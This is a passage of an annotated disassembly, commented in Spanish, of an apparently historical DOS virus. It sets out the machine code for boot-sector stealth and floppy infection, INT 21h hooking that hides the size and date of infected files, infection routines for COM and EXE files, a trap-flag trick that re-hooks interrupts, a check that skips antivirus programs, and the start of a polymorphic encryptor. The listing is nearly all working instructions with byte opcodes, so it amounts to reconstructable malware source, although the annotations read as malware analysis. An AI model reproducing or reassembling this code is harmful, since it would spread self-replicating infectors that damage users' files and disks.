041C 2E FF 2E 86 09          CS JMP D[0986]     ; Salta a la vieja INT 13

0421 E8 DA 03                CALL 07FE          ; llama int 13h
0424 72 F3                   JB 0419            ; error? volver.
0426 E8 9B 03                CALL 07C4          ; big push
0429 BF B8 09                MOV DI,09B8        ; DI apunta a boot buffer
042C 06                      PUSH ES
042D 0E                      PUSH CS
042E 07                      POP ES
042F 1F                      POP DS             ; intercambia ES con CS
                                                ; y DS con ES
0430 8B F3                   MOV SI,BX          ; DS:SI = buffer que us¢ la
                                                ; int 13h
                                                ; ES:DI Boot Buffer
0432 B9 00 01                MOV CX,0100        ; CX 512 bytes
0435 FC                      CLD
0436 F3 A5                   REP MOVSW          ; copia DS:SI a ES:DI
                                                ; copia lo le¡do a Boot Buffer
0438 1E                      PUSH DS
0439 0E                      PUSH CS
043A 1F                      POP DS             ; DS = CS
043B E8 70 FD                CALL 01AE          ; est  el boot le¡do infectado?
043E 07                      POP ES             ; recupera ES
043F 75 3F                   JNE 0480           ; no est  infectado, salta

; ----------------- caso de boot infectado: stealth! ----------------
; ----------------- mostrar boot sin infectar guardado --------------

0441 BF CC 09                MOV DI,09CC        ; offset de 20 (14h) bytes
                                                ; dentro del boot le¡do

0444 8B 4D F4                MOV CX,W[DI-0C]    ; offset de 8 (08h) bytes
0447 B8 32 00                MOV AX,032         ; 32h bytes (50 decimal)
                                                ; clave de encripci¢n del
                                                ; boot sector

044A D3 0D                   ROR W[DI],CL       ; desencripta de byte 14h
044C D1 C1                   ROL CX,1           ; en adelante, 32h words
044E 47                      INC DI             ; (64h bytes)  (100 dec)
044F 47                      INC DI             ; notar que desencripta
0450 48                      DEC AX             ; s¢lo para leer variables
0451 75 F7                   JNE 044A


0453 E8 81 03                CALL 07D7          ; big pop

0456 53                      PUSH BX
0457 51                      PUSH CX
0458 52                      PUSH DX            ; guardar registros

0459 B8 01 02                MOV AX,0201         ; leer un sector

045C 2E 8B 0E E8 09          CS MOV CX,W[09E8]   ; sector y cilindro que ocupa
                                                 ; el virus
0461 2E 8A 36 EC 09          CS MOV DH,B[09EC]   ; cabeza que ocupa el virus
                                                 ; (no drive)

0466 49                      DEC CX              ; hab¡amos sumado 1 antes

0467 E8 80 03                CALL 07EA           ; call int. 13h o 40h
                                                 ; 40h si es diskette
                                                 ; leer primer sector
                                                 ; del virus

046A 9C                      PUSHF
046B B9 00 01                MOV CX,0100         ; CX = 100h

046E 26 F7 17                ES NOT W[BX]        ; desencriptar todo el sector
0471 43                      INC BX              ; reci‚n le¡do
0472 43                      INC BX
0473 E2 F9                   LOOP 046E

0475 9D                      POPF                ; recuperar flags
0476 5A                      POP DX
0477 59                      POP CX
0478 5B                      POP BX              ; recupera registros
0479 EB 9E                   JMP 0419
047B E8 59 03                CALL 07D7           ; big pop
047E EB 99                   JMP 0419            ; volver con un iret falso

; -------------- caso de boot no previamente infectado ----------------


0480 80 FA 80                CMP DL,080          ; es HD?
0483 73 F6                   JAE 047B            ; volver int normal

; ---------------- infectar diskette -----------------------

0485 0E                      PUSH CS
0486 07                      POP ES             ; ES = CS
0487 8B F2                   MOV SI,DX          ; SI = DX
                                                ; guardar dx

                                                ; en boot buffer est 
                                                ; boot le¡do
0489 BF B8 09                MOV DI,09B8        ; ES:DI = boot buffer
048C 8B 45 18                MOV AX,W[DI+018]   ; offset 18h de boot buffer
                                                ; sectores por pista

048F 29 45 13                SUB W[DI+013],AX   ; offset 13h de boot buffer
                                                ; total de sectores
                                                ; restarle una pista...

0492 8B C8                   MOV CX,AX          ; salvar AX en CX
0494 03 45 13                ADD AX,W[DI+013]   ; recuperar valor de
                                                ; total de sectores
                                                ; en AX
0497 0B C0                   OR AX,AX
0499 74 E0                   JE 047B            ; total sectores es 0?
                                                ; volver int normal

049B E3 DE                   JCXZ 047B          ; Total sectores menos
                                                ; una pista es 0?
                                                ; volver int. normal

049D 33 D2                   XOR DX,DX          ; DX = 0
049F F7 F1                   DIV CX             ; AX = AX/CX
                                                ; CX = total sectores
                                                ; menos una pista
                                                ; AX = Total sectores

04A1 0B D2                   OR DX,DX           ; Cociente es cero?
04A3 75 D6                   JNE 047B           ; no, volver int. normal

04A5 8B 5D 1A                MOV BX,W[DI+01A]   ; numero de cabezas en BX
04A8 0B DB                   OR BX,BX           ; es 0?
04AA 74 CF                   JE 047B            ; Si, volver a int. normal

04AC F7 F3                   DIV BX             ; AX = AX/BX
                                                ; BX = nro de cabezas
                                                ; AX = Total sectores

04AE 0B D2                   OR DX,DX           ; cociente cero?
04B0 75 C9                   JNE 047B           ; volver si no es as¡

04B2 8B D6                   MOV DX,SI          ; recuperar DX
04B4 4B                      DEC BX             ; cabezas - 1
04B5 8A F3                   MOV DH,BL          ; DH = cabezas -1
04B7 48                      DEC AX
04B8 8A E8                   MOV CH,AL          ; CH = Sectores / cabezas
04BA B1 01                   MOV CL,1           ; CL = 1
04BC 8B DF                   MOV BX,DI          ; ES:BX = boot buffer
04BE E8 3B FD                CALL 01FC          ; encriptar todo boot buffer
04C1 E8 63 FD                CALL 0227          ; encriptar todo el virus
04C4 B8 06 03                MOV AX,0306        ; Escribir seis sectores

04C7 BB B8 09                MOV BX,09B8        ; ES:BX = boot buffer
04CA E8 46 03                CALL 0813          ; Call old 40h
04CD 72 AC                   JB 047B            ; en caso de error, volver
04CF E8 2A FD                CALL 01FC          ; Desencriptar boot buffer

04D2 E8 EC FC                CALL 01C1          ; Infectar Boot Buffer
04D5 B8 01 03                MOV AX,0301        ; escribir 1 sector
04D8 B9 01 00                MOV CX,1           ; sector 0
04DB 32 F6                   XOR DH,DH          ; head 0
04DD E8 33 03                CALL 0813          ; call old 40h

04E0 E8 F4 02                CALL 07D7          ; big pop

04E3 9C                      PUSHF
04E4 50                      PUSH AX            ; salvar registros

04E5 26 8B 47 18             ES MOV AX,W[BX+018]  ;
04E9 26 29 47 13             ES SUB W[BX+013],AX  ; modificar cant. de sectores
                                                  ; en el buffer
04ED 58                      POP AX
04EE 9D                      POPF                 ; recuperarlos

04EF E9 27 FF                JMP 0419             ; volver a la int 13h vieja


; ---------------- handler int 21h -------------


NEW_INT_21:


04F2 E8 76 FE                CALL 036B          ; Repone los 5 bytes de la OLD
                                                ; (XCHG_INT_21)

04F5 E8 CC 02                CALL 07C4          ; BIG_PUSH

04F8 B0 01                   MOV AL,1           ; Get INT 1
04FA E8 94 FE                CALL 0391          ; call GET_INT

04FD 0E                      PUSH CS            ; DS=CS
04FE 1F                      POP DS             ;

04FF 89 1E 7E 09             MOV W[097E],BX     ; Salva en OLD_INT_1
0503 8C 06 80 09             MOV W[0980],ES     ; el valor de la INT 1h

0507 C6 06 14 06 28          MOV B[0614],028    ; Reemplaza un JMP

050C E8 C8 02                CALL 07D7          ; BIG_POP

050F 80 FC 11                CMP AH,011         ; Fn 11H (Find First FCB)
0512 74 05                   JE 0519            ; S¡, la trata
0514 80 FC 12                CMP AH,012         ; Fn 12H (Find Next FCB)
0517 75 34                   JNE 054D           ; No, sigue

; -------- FBC ----------------

FIND_FIRST_NEXT:
0519 E8 F0 02                CALL 080C          ; CALL_ORG21

051C E8 A5 02                CALL 07C4          ; BIG_PUSH

051F 0A C0                   OR AL,AL           ; AL=0?  Encontr¢ el archivo
0521 75 27                   JNE 054A           ; No, salta y se va.

0523 8B DA                   MOV BX,DX          ; S¡, DS:BX -> FileSpec
0525 8A 0F                   MOV CL,B[BX]       ; CL= nro de drive o
                                                ; FFh si extended FCB

0527 B4 2F                   MOV AH,02F         ; Funci¢n: Get DTA en ES:BX
0529 E8 D9 02                CALL 0805          ; CALL_OLD21
052C FE C1                   INC CL             ; Aumenta CL (nro drive)
052E 75 03                   JNE 0533           ; Si CL<>0, salta (extended FCB)
                                                ; si no, es FCB no extended

0530 83 C3 07                ADD BX,7           ; Suma 7 (ajusta offset para
                                                ; extended FCB)

; ---------- De ac  en adelante parece ser un gran bug. Lo que hace con
;            los handles tiene sentido, pero esto no.
;            Los offsets dentro del FCB est n todos mal.
;            en principio intentar¡a hacer stealth con tama¤o
;            y fecha del archivo

0533 26 80 7F 1A C8          ES CMP B[BX+01A],0C8  ; Low byte of
                                                   ; Device attribute word
                                                   ; or open mode?
                                                   ; Starting Cluster of file
                                                   ; on disk?
                                                   ;

;                 device attribute word
;                 bit 15: drive is SUBSTituted
;                 bit 12: drive is remote
;                 bit  9: direct I/O not allowed


0538 72 10                   JB 054A               ; si es menor a 0C8h salta

                                                   ; si es mayor
053A 26 80 6F 1A C8          ES SUB B[BX+01A],0C8  ; le resta 0C8h
053F 26 81 6F 1D 90 09       ES SUB W[BX+01D],0990 ; 01Dh sector de directory
                                                   ; entry
0545 26 83 5F 1F 00          ES SBB W[BX+01F],0    ; 01Fh entry dentro del
                                                   ; sector

054A E9 C3 00                JMP 0610              ; Se va a la int 21h original

; --------- Handles ------------

054D 80 FC 4E                CMP AH,04E         ; Find First (Handle)
0550 74 05                   JE 0557            ; S¡, la trata
0552 80 FC 4F                CMP AH,04F         ; Find Next (Handle)
0555 75 25                   JNE 057C           ; No, salta

FIND_FIRST_NEXT:
0557 E8 B2 02                CALL 080C          ; CALL_ORG21
055A E8 67 02                CALL 07C4          ; BIG_PUSH

055D B4 2F                   MOV AH,02F         ; Get DTA en ES:BX
055F E8 A3 02                CALL 0805          ; CALL_ORG21

0562 26 80 7F 19 C8          ES CMP B[BX+019],0C8  ; seg. parte de fecha
                                                   ; del archivo
                                                   ; si es menor a 0C8h
0567 72 10                   JB 0579               ; vuelve int 21 org.

; 18h    WORD    file date
;                bits 9-15:  year-1980
;                bits 5-8:   month
;                bits 0-4:   day
; 00000000 11001011 (CBh) son 75 a¤os y 1 mes
; 01234567 89012345
; dddddmmm myyyyyyy
; le suma 200 a los archivos infectados

0569 26 80 6F 19 C8          ES SUB B[BX+019],0C8  ; recupera fecha
056E 26 81 6F 1A 90 09       ES SUB W[BX+01A],0990 ; recupera tama¤o
0574 26 83 5F 1C 00          ES SBB W[BX+01C],0    ; recupera tama¤o

0579 E9 94 00                JMP 0610

; --------------------- otras funciones ----------------------


057C 2E C6 06 14 06 00       CS MOV B[0614],0   ; Repone el JMP $+2
0582 E8 3F 02                CALL 07C4          ; BIG_PUSH

0585 80 FC 3D                CMP AH,03D         ; Open
0588 74 17                   JE 05A1

058A 80 FC 4B                CMP AH,04B         ; Exec
058D 74 0E                   JE 059D

058F 80 FC 6C                CMP AH,06C         ; Extended Open/Create
0592 75 7C                   JNE 0610           ; No, salta

; -------------- Extended open/create

0594 F6 C2 21                TEST DL,021        ; Acci¢n si existe o no
                                                ; 00100001 = open if exists
                                                ; pero el bit 5 est  prendido
                                                ; y no debiera...
                                                ;
0597 75 77                   JNE 0610           ; si est  prendido alguno
                                                ; de esos bytes

; ------------- Open if exists

0599 8B D6                   MOV DX,SI          ; DS:DX -> FileName
                                                ; hace esto por compatibilidad
                                                ; con Open (3Dh)
059B EB 04                   JMP 05A1           ; va a rutina de open

; -------------- Exec

059D 0A C0                   OR AL,AL   ; Si AL <> 0 (load and execute)
059F 75 6F                   JNE 0610   ; Salta

; -------------- Open

05A1 52                      PUSH DX            ; Salva registros
05A2 1E                      PUSH DS            ;

05A3 0E                      PUSH CS            ;
05A4 1F                      POP DS             ; DS = CS

05A5 B0 24                   MOV AL,024         ; Critical Error
05A7 E8 E7 FD                CALL 0391          ; Get Old INT 24
05AA BA C1 07                MOV DX,07C1        ; Set New INT 24
05AD E8 F2 FD                CALL 03A2          ; (return fail)

05B0 1F                      POP DS             ; Recupera registros
05B1 5A                      POP DX             ;

05B2 50                      PUSH AX            ; Salva registros
05B3 53                      PUSH BX            ;
05B4 06                      PUSH ES            ;

05B5 E8 A3 01                CALL 075B          ; se fija si es un antivirus
05B8 72 50                   JB 060A            ; si hay error, salta

05BA B8 00 43                MOV AX,04300       ; Funci¢n 4300h, get attributes
05BD E8 45 02                CALL 0805          ; llama a vieja int 21h
05C0 72 48                   JB 060A            ; error? salta

05C2 F6 C1 04                TEST CL,4          ; bit 2 (100) prendido?
05C5 75 43                   JNE 060A           ; salta si es system

05C7 B8 01 43                MOV AX,04301       ; set file atributes

05CA 50                      PUSH AX
05CB 51                      PUSH CX
05CC 52                      PUSH DX
05CD 1E                      PUSH DS            ; guarda registros

05CE 33 C9                   XOR CX,CX          ; CX = 0  (clear attributes)
05D0 E8 32 02                CALL 0805          ; int 21h

05D3 72 2E                   JB 0603            ; error?

05D5 B8 02 3D                MOV AX,03D02
05D8 E8 2A 02                CALL 0805          ; int 21h (open, read write)

05DB 72 26                   JB 0603            ; error?

05DD 93                      XCHG AX,BX         ; poner handle en BX
05DE 0E                      PUSH CS
05DF 1F                      POP DS             ; DS = CS

05E0 B8 00 57                MOV AX,05700
05E3 CD 21                   INT 021            ; get date and time

05E5 72 17                   JB 05FE            ; error? close y me voy

05E7 80 FE C8                CMP DH,0C8         ; fecha sumada?
05EA 73 12                   JAE 05FE           ; infectado, close y me voy

05EC 51                      PUSH CX
05ED 52                      PUSH DX            ; guarda regs
05EE E8 52 00                CALL 0643          ; rutina infecci¢n files
05F1 5A                      POP DX
05F2 59                      POP CX             ; recupera regs

05F3 72 09                   JB 05FE            ; error? close y me voy
05F5 80 C6 C8                ADD DH,0C8         ; sumo 0C8h a la fecha

05F8 B8 01 57                MOV AX,05701
05FB E8 07 02                CALL 0805          ; int 21h (set date and time)

; ------------

05FE B4 3E                   MOV AH,03E
0600 E8 02 02                CALL 0805    ; int 21h (close file)

; ----------

0603 1F                      POP DS
0604 5A                      POP DX
0605 59                      POP CX
0606 58                      POP AX
0607 E8 FB 01                CALL 0805  ; int 21h (reset attributes)

; --------------------

060A 1F                      POP DS
060B 5A                      POP DX
060C 58                      POP AX
060D E8 92 FD                CALL 03A2          ; redefinir interr. 24h
                                                ; a la original

0610 E8 C4 01                CALL 07D7          ; BIG_POP

0613 EB 00                   JMP 0615           ; Puede ser JMP 613+28+3
                                                ; o sea JMP 63D
                                                ; el handler de la int 21 lo
                                                ; modifica al empezar y hace
                                                ; que apunte al IRET falso
                                                ; mientras trata los finds
                                                ; luego lo recupera y apunta
                                                ; a la sig. instrucci¢n:

0615 E8 AC 01                CALL 07C4          ; BIG_PUSH

0618 0E                      PUSH CS            ; DS=CS
0619 1F                      POP DS             ;

061A C6 06 9E 09 03          MOV B[099E],3      ; FLAG=3
061F C6 06 9F 09 05          MOV B[099F],5      ; 5 instrucciones

0624 B0 01                   MOV AL,1           ; Set New INT 1
0626 BA 02 03                MOV DX,0302        ;
0629 E8 76 FD                CALL 03A2          ; redefine int 1
                                                ; en 5 instrucciones
                                                ; la nueva int 1
                                                ; hace XCHG_INT_21
                                                ; y recupera la vieja int 1
                                                ; con esto re-truchea
                                                ; la int 21h para que
                                                ; apunte al virus

062C E8 A8 01                CALL 07D7          ; BIG_POP

062F 50                      PUSH AX            ; Set Trap Flag
0630 9C                      PUSHF              ;
0631 58                      POP AX             ;
0632 80 CC 01                OR AH,1            ;
0635 50                      PUSH AX            ;
0636 9D                      POPF               ; enciende int 1h
0637 58                      POP AX             ;

0638 2E FF 2E 8A 09          CS JMP D[098A]     ; CALL_OLD21 (la verdadera)

; volver despu‚s de procesar FINDs

063D E8 2B FD                CALL 036B          ; XCHG_INT_21 (la re-truchea)
0640 CA 02 00                RETF 2


; ------------- rutina de infecci¢n ----------------------

0643 B4 3F                   MOV AH,03F        ; read from file
0645 B9 18 00                MOV CX,018        ; 18h (24 dec) bytes
0648 BA A0 09                MOV DX,09A0       ; en un buffer
064B E8 B7 01                CALL 0805         ; int 21h

064E 72 76                   JB 06C6           ; error? volver con error

0650 2B C8                   SUB CX,AX         ; cuantos bytes ley¢?
0652 75 72                   JNE 06C6          ; si no es el total,
                                               ; volver con error

0654 8B F2                   MOV SI,DX         ; DS:SI apunta a buffer
0656 B8 02 42                MOV AX,04202      ; lseek a end of file
0659 99                      CWD               ; DX = 0 (CX = 0)
065A E8 A8 01                CALL 0805         ; int 21h

065D 91                      XCHG AX,CX        ; DX:CX = long. de archivo
                                               ; AX = 0

065E FC                      CLD
065F AD                      LODSW             ; lee primer word del buffer
                                               ; (ojo, incrementa SI en dos)
0660 A3 3D 08                MOV W[083D],AX    ; lo guarda en variable
0663 3D 4D 5A                CMP AX,05A4D      ; es 'MZ'?
0666 74 2F                   JE 0697           ; va a infect. exe

0668 3D 5A 4D                CMP AX,04D5A      ; es 'ZM'?
066B 74 2A                   JE 0697           ; va a infect. exe

; -------------------- infectando .COM

066D 0B FF                   OR DI,DI          ; DI = 0? (es .COM?)
066F 75 55                   JNE 06C6          ; no, volver con error

0671 0B D2                   OR DX,DX          ; DX = 0? (file menor 64k?)
0673 75 51                   JNE 06C6          ; no, volver con error

0675 81 F9 88 F2             CMP CX,0F288      ; long de archivo mayor 62088?
0679 77 4B                   JA 06C6           ; si, volver con error

067B 81 F9 E8 03             CMP CX,03E8       ; archivo menor a 1000?
067F 72 45                   JB 06C6           ; si, volver con error

0681 8A 04                   MOV AL,B[SI]      ; tercer byte del PRG
0683 A2 3F 08                MOV B[083F],AL    ; guardarlo en variable
0686 83 E9 03                SUB CX,3          ; longitud arch. - 3

0689 C6 44 FE E9             MOV B[SI-2],0E9   ; poner en el principio del
068D 89 4C FF                MOV W[SI-1],CX    ; archivo un jmp al final

0690 81 C1 03 01             ADD CX,0103       ; CX = long. archivo + 100h
0694 91                      XCHG AX,CX        ; AX = long. archivo + 100h
0695 EB 03                   JMP 069A          ; seguir con infecci¢n

; ---------------- infectar .EXE

0697 E8 2E 00                CALL 06C8        ; modificaci¢n del header

; --------------------- infecci¢n real

069A 0E                      PUSH CS
069B 07                      POP ES           ; ES = CS
069C E8 AA 01                CALL 0849        ; rutina generadora de encriptor
                                              ; mas 04bdh (1243) bytes
                                              ; de c¢digo encriptado

069F B4 40                   MOV AH,040       ; write file
06A1 B9 90 09                MOV CX,0990      ; 990h bytes (2448)
06A4 BA B8 0B                MOV DX,0BB8      ; a partir de 0BB8h (C¢d. encrip)
06A7 E8 5B 01                CALL 0805        ; int 21h

06AA 72 1A                   JB 06C6          ; Si hay error, volver con error

06AC 2B C8                   SUB CX,AX        ; Si no pudo escribir todo
06AE 75 16                   JNE 06C6         ; volver con error

06B0 B8 00 42                MOV AX,04200
06B3 99                      CWD              ; DX = 0 (CX = 0)
06B4 E8 4E 01                CALL 0805        ; lseek al principio del archivo

06B7 72 0D                   JB 06C6          ; si hay error, volver con error

06B9 B4 40                   MOV AH,040       ; Write file
06BB B9 18 00                MOV CX,018       ; 18h bytes
06BE BA A0 09                MOV DX,09A0      ; escribe buffer header
06C1 E8 41 01                CALL 0805        ; int 21h

06C4 F8                      CLC
06C5 C3                      RET      ; volver sin error

06C6 F9                      STC
06C7 C3                      RET      ; volver con error

; ------------------- infecci¢n de .EXE

06C8 53                      PUSH BX             ; guardar BX
06C9 C4 44 12                LES AX,[SI+012]     ; carga en ES:AX
                                                 ; offset 14h del buffer:
                                                 ; punto de entrada del .EXE
06CC A3 3F 08                MOV W[083F],AX
06CF 8C 06 41 08             MOV W[0841],ES      ; lo salva en las variable

06D3 C4 44 0C                LES AX,[SI+0C]      ; carga en ES:AX offs. 0Eh
                                                 ; SS:SP inicial del programa

06D6 A3 45 08                MOV W[0845],AX
06D9 8C 06 43 08             MOV W[0843],ES      ; los guarda en variables

06DD 0E                      PUSH CS
06DE 07                      POP ES              ; ES = CS

06DF 91                      XCHG AX,CX          ; long arch. en AX
                                                 ;
06E0 8B D8                   MOV BX,AX           ; BX = AX
06E2 8B FA                   MOV DI,DX           ; DI = DX
06E4 B9 00 02                MOV CX,0200         ; CX = 200h
06E7 F7 F1                   DIV CX              ; AX = DX:AX / CX
                                               ; AX = long. file + 100h / 200h
06E9 40                      INC AX            ; AX = AX + 1

                                               ; chequear existencia de
                                               ; overlays o cosas as¡

06EA 39 44 02                CMP W[SI+2],AX    ; numero total de p ginas
06ED 75 69                   JNE 0758          ; volver con error
                                               ; (hay bytes de mas o menos)

06EF 39 14                   CMP W[SI],DX      ; bytes en £ltima pagina
06F1 75 65                   JNE 0758          ; volver con error
                                               ; (hay bytes de mas o menos)

06F3 05 04 00                ADD AX,4
06F6 81 C2 90 01             ADD DX,0190       ; sumar long. virus

06FA 81 FA 00 02             CMP DX,0200       ; DX = 200h?
06FE F5                      CMC               ; complementar carry

06FF 15 00 00                ADC AX,0          ; sumarle el carry a AX
0702 80 E6 01                AND DH,1          ;

0705 89 44 02                MOV W[SI+2],AX
0708 89 14                   MOV W[SI],DX      ; guardar nueva long. archivo

070A 8B D7                   MOV DX,DI         ;
070C 93                      XCHG AX,BX        ; DX:AX = long. archivo

070D 8B 5C 06                MOV BX,W[SI+6]    ; tama¤o header en BX
0710 33 FF                   XOR DI,DI         ; DI = 0
0712 B9 04 00                MOV CX,4          ; CX = 4

0715 D1 E3                   SHL BX,1          ;
0717 D1 DF                   RCR DI,1
0719 E2 FA                   LOOP 0715         ; loop 4 veces

071B 2B C3                   SUB AX,BX
071D 1B D7                   SBB DX,DI
071F BB 88 F2                MOV BX,0F288

0722 3B C3                   CMP AX,BX
0724 72 06                   JB 072C

0726 2D 10 00                SUB AX,010
0729 42                      INC DX
072A EB F6                   JMP 0722

072C 83 FA 0F                CMP DX,0F
072F 77 27                   JA 0758       ; vuelta con error

0731 B1 04                   MOV CL,4
0733 D3 CA                   ROR DX,CL
0735 89 44 12                MOV W[SI+012],AX
0738 89 54 14                MOV W[SI+014],DX  ; CS:IP apuntan al virus

073B 50                      PUSH AX           ; guarda AX
073C 2B C3                   SUB AX,BX
073E 24 FE                   AND AL,0FE
0740 89 44 0E                MOV W[SI+0E],AX   ; SP inicial
0743 83 C2 10                ADD DX,010
0746 89 54 0C                MOV W[SI+0C],DX   ; SS inicial
0749 D3 E8                   SHR AX,CL
074B 01 44 08                ADD W[SI+8],AX    ; minimos parrafos de memoria
074E 58                      POP AX            ; recupera AX

074F 83 7C 0A FF             CMP W[SI+0A],-1   ; maximos parrafos de memoria
0753 75 03                   JNE 0758          ; vuelta con error

0755 5B                      POP BX
0756 F8                      CLC
0757 C3                      RET         ; vuelta sin error

0758 5B                      POP BX
0759 F9                      STC
075A C3                      RET         ; vuelta con error

; ------- Rutina que detecta que archivos no infectar: los anti-virus
; ------- primero verifica si la extensi¢n es .COM, si es as¡ pone 0
; ------- en DI

075B 1E                      PUSH DS            ; ES=DS
075C 07                      POP ES             ;

075D 8B FA                   MOV DI,DX          ; ES:DI -> ASCIIZ (FileName)

075F B9 50 00                MOV CX,050         ; Busca fin de ASCIIZ
0762 33 C0                   XOR AX,AX          ;
0764 FC                      CLD                ;
0765 F2 AE                   REPNE SCASB        ; posicionarse 1 despues del
                                                ; fin del ASCIIZ

0767 75 21                   JNE 078A           ; Si not found, volver
                                                ; con error

0769 FD                      STD                ; direction flag
076A 8B F7                   MOV SI,DI          ; SI = DI
076C 33 FF                   XOR DI,DI          ; DI = 0
076E B9 05 00                MOV CX,5           ; CX = 5
0771 AC                      LODSB              ; AX siguiente a 0 (del ASCIIZ)
0772 56                      PUSH SI            ; Salva SI

0773 AC                      LODSB              ; Lee un caracter
0774 24 DF                   AND AL,0DF         ; UpperCase
0776 33 F8                   XOR DI,AX          ; XOR DI con AX (char leido)
0778 D3 E7                   SHL DI,CL          ; hace shift
077A E2 F7                   LOOP 0773          ; 5 veces

077C 81 EF C4 25             SUB DI,025C4       ; resta DI
                                                ; DI queda en 0 si
                                                ; archivo es .COM

0780 5E                      POP SI             ; SI -> 0 (del ASCIIZ)
0781 57                      PUSH DI            ; Salva DI
0782 E8 07 00                CALL 078C          ; compara con lista de 7
                                                ; anti virus a no infectar
0785 5F                      POP DI             ; recupera DI
0786 72 02                   JB 078A            ; salta si error a return
                                                ; with carry

0788 F8                      CLC                ; Clear Carry (todo bien)
0789 C3                      RET

078A F9                      STC                ; Set Carry (error)
078B C3                      RET

; ------------------ rutina que detecta que archivos no
;                    infectar: los anti-virus

078C 0E                      PUSH CS            ; ES=CS
078D 07                      POP ES             ;

078E B9 07 00                MOV CX,7           ; busca 7 anti virus
0791 BF 21 08                MOV DI,0821        ; ES:DI -> CLAVE (TORP)


0794 51                      PUSH CX            ;
0795 57                      PUSH DI            ;
0796 56                      PUSH SI            ; guarda registros

0797 BB 0A 00                MOV BX,0A          ;

079A B9 04 00                MOV CX,4           ; 4 bytes
079D 57                      PUSH DI            ; guarda DI

079E FD                      STD                ; Desencripta el ASCII
079F AC                      LODSB              ; y lo compara con la
07A0 24 DF                   AND AL,0DF         ; inversa de la CLAVE
07A2 34 AD                   XOR AL,0AD         ; TORP (PROT)
07A4 FC                      CLD                ;
07A5 AE                      SCASB              ;
07A6 E1 F6                   LOOPE 079E         ;

07A8 5F                      POP DI             ; ES:DI -> CLAVE

07A9 74 11                   JE 07BC            ; Si conicid¡an, se va

07AB 3B F2                   CMP SI,DX          ; Ppio del ASCIIZ?
07AD 74 03                   JE 07B2            ; S¡, salta

07AF 4B                      DEC BX             ; Decrementa BX
07B0 75 E8                   JNE 079A           ; Repite 10 veces

07B2 5E                      POP SI             ;
07B3 5F                      POP DI             ;
07B4 59                      POP CX             ; recupera registros

07B5 83 C7 04                ADD DI,4           ; suma 4 al DI para
07B8 E2 DA                   LOOP 0794          ; buscar proxima

07BA F8                      CLC                ; vuelve sin error
07BB C3                      RET

07BC 5E                      POP SI
07BD 5F                      POP DI
07BE 59                      POP CX             ; recupera regs.

07BF F9                      STC                ; vuelve con error
07C0 C3                      RET

; --------------------- handler int 24h

NEW_INT_24:
07C1 B0 03                   MOV AL,3
07C3 CF                      IRET               ; fail

; --------------- big push

BIG_PUSH:
07C4 2E 8F 06 9C 09          CS POP W[099C]     ; Salva direcci¢n de retorno
07C9 9C                      PUSHF              ; Salva los registros
07CA 50                      PUSH AX            ;
07CB 53                      PUSH BX            ;
07CC 51                      PUSH CX            ;
07CD 52                      PUSH DX            ;
07CE 57                      PUSH DI            ;
07CF 56                      PUSH SI            ;
07D0 1E                      PUSH DS            ;
07D1 06                      PUSH ES            ;
07D2 2E FF 26 9C 09          CS JMP W[099C]     ; Vuelta al caller

; ---------------- big pop

BIG_POP:
07D7 2E 8F 06 9C 09          CS POP W[099C]
07DC 07                      POP ES
07DD 1F                      POP DS
07DE 5E                      POP SI
07DF 5F                      POP DI
07E0 5A                      POP DX
07E1 59                      POP CX
07E2 5B                      POP BX
07E3 58                      POP AX
07E4 9D                      POPF
07E5 2E FF 26 9C 09          CS JMP W[099C]

; --------------- llama a int 13 o 40h segun si es diskette o HD

07EA 80 FA 80                CMP DL,080
07ED 73 04                   JAE 07F3
07EF E8 21 00                CALL 0813
07F2 C3                      RET
07F3 E8 01 00                CALL 07F7
07F6 C3                      RET

; ------------ call old 13h

CALL_OLD_13:
07F7 9C                      PUSHF
07F8 2E FF 1E 82 09          CS CALL D[0982]
07FD C3                      RET

; ------------ call old 13h

CALL_OLD_13:                 ; llamar a old interrupt 13h
07FE 9C                      PUSHF
07FF 2E FF 1E 86 09          CS CALL D[0986]
0804 C3                      RET

; ------------ call old 21h

CALL_OLD_21:
0805 9C                      PUSHF
0806 2E FF 1E 8A 09          CS CALL D[098A]
080B C3                      RET


; ------------ call old 21h

CALL_OLD_21:
080C 9C                      PUSHF
080D 2E FF 1E 8E 09          CS CALL D[098E]
0812 C3                      RET

; ------------ call old 40h

CALL_OLD_40:
0813 9C                      PUSHF
0814 2E FF 1E 92 09          CS CALL D[0992]
0819 C3                      RET

; ------------ call old 40h

CALL_OLD_40:
081A 9C                      PUSHF
081B 2E FF 1E 96 09          CS CALL D[0996]
0820 C3                      RET

; ---------- Zona de datos

; -------------- Archivos a no infectar:

0821 F9 E2 FF FD             ; TORP   PROT
0825 E3 EC EE FE             ; NACS   SCAN
     EC E8 E1 EE             ; AELC   CLEA
082D EB EC FE FB             ; FASV   VSAF
0831 FB EC FD EE             ; VAPC   CPAV
0835 A3 FB EC E3             ; .VAN   NAV.
     E2 EE E8 E9             ; OCED   DECO


; ---------- Zona de variables

083D                      DW ? ; comienzo del .COM
083F                      DW ? ; Tercer byte del .COM o punto de entrada .EXE

0841                      DW ? ; Continuacion punto entrada .EXE

0843                      DW ? ; posici¢n stack inicial de .EXE
0845                      DW ? ; continuacion posici¢n stack inicial de .EXE

0847                      DW ? ; randomize buffer

; -------------------- rutina genera decriptor y encripta el c¢digo, 1243 bytes
;                      lo genera a partir de 0BB8

0849 53                      PUSH BX
084A 55                      PUSH BP       ; guardar registros

084B 95                      XCHG AX,BP    ; BP = AX (long archivo + 100h)
084C B8 FF FF                MOV AX,-1     ;
084F E8 FE 00                CALL 0950     ; randomize AX
0852 93                      XCHG AX,BX    ; BX = random
0853 BE 25 09                MOV SI,0925   ; SI apunta a decriptor
0856 BF B8 0B                MOV DI,0BB8   ; DI apunta a buffer
0859 FC                      CLD
085A A5                      MOVSW         ;
085B A4                      MOVSB         ; copia 3 primeros bytes de
                                           ; decriptor al buffer
                                           ; esos 3 bytes son constantes

085C AD                      LODSW         ; sig. word en AX

085D 03 C5                   ADD AX,BP     ; se le agrega long. archivo
085F AB                      STOSW         ; y se guarda. (MOV DI, INMED.)
0860 A4                      MOVSB         ; se copia el byte siguiente
                                           ; (MOV AX, INMED.)

0861 AD                      LODSW         ; copia siguiente byte en AX
0862 8B C3                   MOV AX,BX     ; clave en AX
0864 AB                      STOSW         ; queda MOV AX, clave

0865 A5                      MOVSW
0866 A5                      MOVSW
0867 A5                      MOVSW         ; se copia hasta el JS sin incluir
                                           ; otros 3 words constantes

0868 B8 07 00                MOV AX,7      ;
086B E8 E2 00                CALL 0950     ; randomize AX (de 0 a 7)
086E D1 E0                   SHL AX,1
0870 D1 E0                   SHL AX,1      ; se multiplica AX por 4
